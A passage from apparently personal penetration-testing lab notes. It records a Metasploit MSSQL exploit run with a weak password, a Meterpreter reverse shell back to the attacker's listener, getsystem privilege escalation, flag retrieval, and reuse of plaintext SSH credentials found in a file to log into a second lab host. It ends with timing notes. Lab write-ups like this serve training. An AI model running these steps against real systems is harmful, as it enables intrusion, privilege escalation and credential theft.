   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/mssql/mssql_payload) > set PASSWORD qwerty
PASSWORD => qwerty
msf6 exploit(windows/mssql/mssql_payload) > run

[*] Started reverse TCP handler on 172.16.64.10:4444 
[*] 172.16.64.199:1433 - Command Stager progress -   1.47% done (1499/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -   2.93% done (2998/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -   4.40% done (4497/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -   5.86% done (5996/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -   7.33% done (7495/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -   8.80% done (8994/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  10.26% done (10493/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  11.73% done (11992/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  13.19% done (13491/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  14.66% done (14990/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  16.13% done (16489/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  17.59% done (17988/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  19.06% done (19487/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  20.53% done (20986/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  21.99% done (22485/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  23.46% done (23984/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  24.92% done (25483/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  26.39% done (26982/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  27.86% done (28481/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  29.32% done (29980/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  30.79% done (31479/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  32.25% done (32978/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  33.72% done (34477/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  35.19% done (35976/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  36.65% done (37475/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  38.12% done (38974/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  39.58% done (40473/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  41.05% done (41972/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  42.52% done (43471/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  43.98% done (44970/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  45.45% done (46469/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  46.91% done (47968/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  48.38% done (49467/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  49.85% done (50966/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  51.31% done (52465/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  52.78% done (53964/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  54.24% done (55463/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  55.71% done (56962/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  57.18% done (58461/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  58.64% done (59960/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  60.11% done (61459/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  61.58% done (62958/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  63.04% done (64457/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  64.51% done (65956/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  65.97% done (67455/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  67.44% done (68954/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  68.91% done (70453/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  70.37% done (71952/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  71.84% done (73451/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  73.30% done (74950/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  74.77% done (76449/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  76.24% done (77948/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  77.70% done (79447/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  79.17% done (80946/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  80.63% done (82445/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  82.10% done (83944/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  83.57% done (85443/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  85.03% done (86942/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  86.50% done (88441/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  87.96% done (89940/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  89.43% done (91439/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  90.90% done (92938/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  92.36% done (94437/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  93.83% done (95936/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  95.29% done (97435/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  96.76% done (98934/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  98.19% done (100400/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress -  99.59% done (101827/102246 bytes)
[*] 172.16.64.199:1433 - Command Stager progress - 100.00% done (102246/102246 bytes)
[*] Sending stage (175174 bytes) to 172.16.64.199
[*] Meterpreter session 1 opened (172.16.64.10:4444 -> 172.16.64.199:49671) at 2021-08-22 05:38:23 -0400

meterpreter > sysinfo
Computer        : WIN10
OS              : Windows 10 (10.0 Build 10586).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > screenshot
[-] Error running command screenshot: Rex::RuntimeError Current session was spawned by a service on Windows 8+. No desktops are available to screenshot.
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:
meterpreter > search -f flag.txt
Found 1 result...
    c:\Users\AdminELS\Desktop\flag.txt (47 bytes)
meterpreter > cat c:\Users\AdminELS\Desktop\flag.txt 
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cat "c:\Users\AdminELS\Desktop\flag.txt"
Congratulations! You exploited this machine! 
meterpreter > cd C:\Users
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
```

```
meterpreter > ls
Listing: C:\Users\AdminELS\Desktop
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  853   fil   2019-03-12 08:31:52 -0400  HeidiSQL.lnk
100666/rw-rw-rw-  282   fil   2017-12-15 17:42:58 -0500  desktop.ini
100666/rw-rw-rw-  47    fil   2019-04-02 06:13:19 -0400  flag.txt
100666/rw-rw-rw-  632   fil   2019-03-13 02:58:33 -0400  id_rsa.pub

meterpreter > cat flag.txt
Congratulations! You exploited this machine! 
meterpreter > cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################meterpreter > 
```

### Server 3 Continuation
```
┌──(kali㉿kali)-[/media/sf_tmp]
└─$ ssh://developer:dF3334slKw@172.16.64.182:22
zsh: no such file or directory: ssh://developer:dF3334slKw@172.16.64.182:22
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/sf_tmp]
└─$ ssh developer@172.16.64.182:22                                                                                                                                127 ⨯
ssh: Could not resolve hostname 172.16.64.182:22: Name or service not known
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/sf_tmp]
└─$ ssh developer@172.16.64.182                                                                                                                                   255 ⨯
developer@172.16.64.182's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

195 packages can be updated.
10 updates are security updates.

Last login: Sun May 19 05:36:41 2019 from 172.16.64.13
developer@xubuntu:~$ ls
flag.txt
developer@xubuntu:~$ cat flag.txt
Congratulations, you got it!
```

### Server 2 Continuation
![4198f2949a295571ae876c0ec29bd4d2.png](../../_resources/7b69e169d1c34744a63dac1b1edfa289.png)

![ddf926918ba89bf28785baee78913e21.png](../../_resources/13ee497d0e4544428926674236bd8f7b.png)



![674a9fee6dfb1b6aeac1d98196be791b.png](../../_resources/1bc6b17f46d049a4bce119910c2a9cac.png)

Just needed to know I was in the right direction (referred to ans like only the 1st section of ans)
- Should enum more throughly


## Timings
Nmap,Dirb - 1h

Gobuster/Dirb/Hydra - 20min passed

3h or so? 1st machine
Next 3h (including slacking time and waiting for password cracking) - Server 4
Next 20min for Server 3
hydra u